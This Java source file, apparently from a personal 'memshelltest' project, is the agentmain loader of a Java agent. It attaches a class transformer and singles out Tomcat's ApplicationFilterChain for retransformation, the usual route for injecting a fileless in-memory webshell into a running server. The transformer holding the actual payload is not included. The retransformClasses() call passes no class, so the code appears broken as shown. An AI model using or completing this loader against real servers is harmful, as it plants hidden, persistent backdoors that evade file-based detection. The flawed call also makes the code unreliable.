package priv.memshelltest;

import java.lang.instrument.Instrumentation;

public class Agent {
    public static void agentmain(String agentArgs, Instrumentation inst){
        inst.addTransformer(new Transformer(),true);
        System.out.println("Agent Main Done");

        Class[] loadedClasses =inst.getAllLoadedClasses();
        System.out.println("全部的类:"+loadedClasses);
        for (Class c:loadedClasses){
//            System.out.println(c.getName());
            //筛选需要重新加载的类
            if (c.getName().equals("org.apache.catalina.core.ApplicationFilterChain")){
                try {
                    inst.retransformClasses();
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
